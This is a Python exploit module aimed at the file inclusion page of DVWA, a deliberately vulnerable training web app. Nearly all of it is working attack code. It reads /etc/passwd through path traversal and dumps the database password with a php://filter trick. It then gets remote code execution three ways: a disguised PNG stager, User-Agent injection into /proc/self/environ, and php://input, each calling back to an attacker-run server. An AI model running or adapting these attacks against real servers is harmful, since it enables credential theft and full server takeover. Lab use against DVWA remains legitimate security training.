
import requests
import time
import base64
import random
from bs4 import BeautifulSoup
from urllib.parse import urljoin , urlencode , urlparse
from core.network import *
from core.common import *

def get_users_info(url,cookies,headers):
    payload = {
        "page" : "../../../../../../../../../etc/passwd"
    }

    vulnerable_path = f"vulnerabilities/fi/?{urlencode(payload)}"
    full_url = urljoin(url,vulnerable_path)
    html_content = requests.get(full_url,cookies=cookies,headers=headers).content.decode()

    if '<b>Warning' in html_content:
        delimiter = '<br />'
    elif '<!DOCTYPE' in html_content:
        delimiter = '<!DOCTYPE'

    print("\t\t",end='')
    print(html_content.split(delimiter)[0].strip().replace("\n","\n\t\t"))

def get_config(url,cookies,headers):

    payload = {
        'page' : 'php://filter/convert.base64-encode/resource=../../config/config.inc.php'
    }

    vulnerable_path = f"vulnerabilities/fi/?{urlencode(payload)}"
    full_url = urljoin(url,vulnerable_path)

    txtContent = requests.get(full_url,cookies=cookies,headers=headers).text
    
    if '<b>Warning' in txtContent:
        delimiter = '<br />'
    elif '<!DOCTYPE' in txtContent:
        delimiter = '<!DOCTYPE'

    b64data = txtContent.split(delimiter)[0].strip()
    data = base64.standard_b64decode(b64data).decode('utf-8')

    for line in data.splitlines():
        if '=' in line:
            arg , value = line.split('=')

            if arg == "$_DVWA[ 'db_server' ] ":
                print(f"\t\tServer      = {value}")
            
            elif arg == "$_DVWA[ 'db_database' ] ":
                print(f"\t\tDatabase    = {value}")

            elif arg == "$_DVWA[ 'db_user' ] ":
                print(f"\t\tUser        = {value}")

            elif arg == "$_DVWA[ 'db_password' ] ":
                print(f"\t\tPassword    = {value}")


def to_rce(url,cookies,headers,server):
    shell_name = str(random.randint(11111,99999))
    payload = php_payload(lhost=server.host,lport=server.port,shell_name=shell_name)
    
    if upload_file(url,cookies,'stager.png',payload,'image/png'):
        time.sleep(10)

        # Request stager.png from vulnerable lfi parameter which execute contained php code and get our upload php file to the server

        lfi_request_file(url,cookies,headers,'../../hackable/uploads/stager.png')
        
        shell_path = urljoin(url,'vulnerabilities/fi/' + shell_name + '.php')
        check_exploit_succeed(shell_path,headers)

    else:
        print("\t\tExploit Failed")


def to_rce2(url,cookies,headers,server):
    writeable_file = "/proc/self/environ"
    vulnerable_path = "vulnerabilities/fi/?"

    full_url = urljoin(url,vulnerable_path + urlencode({'page' : writeable_file}))
    res = requests.get(full_url,cookies=cookies,headers=headers)
    
    if 'HTTP_USER_AGENT' in res.text:
        host = urlparse(url).hostname
        shell_name = str(random.randint(11111,99999))
        payload = php_payload(lhost=server.host,lport=server.port,shell_name=shell_name)
        injected_headers = makeHeaders(host, userAgent = payload)
        
        # Inject php code in user agent header 
        # The code will execute in request when server read code from /proc/self/environ

        lfi_request_file(url,cookies,injected_headers,writeable_file)
        time.sleep(5)
        shell_path = urljoin(url,'vulnerabilities/fi/' + shell_name + '.php')
        check_exploit_succeed(shell_path,headers)

    else:
        print("\t\tExploit Failed")


def to_rce3(url,cookies,headers,server):
    
    shell_name = str(random.randint(11111,99999))
    payload = php_payload(lhost=server.host,lport=server.port,shell_name=shell_name)
    vulnerable_path = "vulnerabilities/fi/?"
    full_url = urljoin(url,vulnerable_path + urlencode({'page' : "php://input"}))
    res = requests.get(full_url,cookies=cookies,headers=headers,data=payload)

    if 'failed to open stream: Success in' not in res.text:
        shell_path = urljoin(url,'vulnerabilities/fi/' + shell_name + '.php')
        time.sleep(5)
        check_exploit_succeed(shell_path,headers)

    else:
        print("\t\tExploit Failed")


def exploit(url,cookies = {}):
    print("Try Dvwa LFI exploit :")

    # Handle Http Server
    host = urlparse(url).hostname
    headers = makeHeaders(host)
    ip = ip_on_same_network(host) if ip_on_same_network(host) else get_public_ip()
    port = 8000
    s = WebServer(ip,port)
    s.run()

    # First techniqe

    print("\tAccess server's users info :")
    get_users_info(url,cookies,headers)

    # Second techniqe

    print("\n\tGet Database credenitials and info :")
    get_config(url,cookies,headers)
    
    # Third techniqe

    print("\n\tEscalate LFI to RCE (First techniqe) :")
    to_rce(url,cookies,headers,s)

    # Fourth techniqe

    print("\n\tEscalate LFI to RCE (Second techniqe) :")
    to_rce2(url,cookies,headers,s)

    # Fifth techniqe

    print("\n\tEscalate LFI to RCE (Third techniqe) :")
    to_rce3(url,cookies,headers,s)

    s.stop()